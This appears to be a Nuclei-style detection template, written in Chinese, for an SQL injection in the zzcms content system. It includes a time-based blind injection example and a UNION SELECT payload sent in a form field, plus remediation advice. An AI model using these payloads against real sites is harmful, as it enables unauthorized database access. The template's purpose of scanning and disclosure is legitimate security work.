id: zzcms-zsmanage-sqli
info:
  name: zzcms-zsmanage-sqli
  author:
  - l0ne1y
  description: "zzcms 存在SQL注入漏洞\n通过白盒审计工具，发现 /user/del.php 存在SQL注入漏洞，$tablename 可控，可以进行SQL注入。由于$tablename
    所在位置无需闭合引号和CMS过滤大于号和小于号（转换为实体），拼接为 select id,editor, from zzcms_answer where id
    = 1 and if((ascii(substr(user(),1,1)) =121),sleep(5),1)#where id in 1; 拼接成如此的SQL语句可以完成注入。 "
  reference:
  - https://github.com/jcqsteven/blog/issues/18
  severity: high
  remediation: |
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：

    临时修复方案：
    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
    4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
    5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。
    6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
    7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
    8、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: status
    status:
    - 200
  path:
  - '{{BaseURL}}/user/zs.php?do=save'
  method: POST
  body: proname={{randstr}}&tz=1%E4%B8%87%E4%BB%A5%E4%B8%8B&prouse={{r0}}&sx%5B%5D=&sx%5B%5D=&sm={{r0}}&province=%E5%85%A8%E5%9B%BD&city=%E5%85%A8%E5%9B%BD%E5%90%84%E5%9C%B0%E5%8C%BA&xiancheng=&cityforadd=&img=%2Fimage%2Fnopic.gif&flv=&zc=&yq=&action=add&Submit=%E5%A1%AB%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%B8%83%E4%BF%A1%E6%81%AF&smallclassid[]=1&smallclassid[]=2)%20union%20select%20{{randstr}}%23
  headers:
    Content-Type: application/x-www-form-urlencoded
- matchers:
  - type: word
    part: body
    words:
    - '{{randstr}}'
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/user/zsmanage.php'
  method: GET
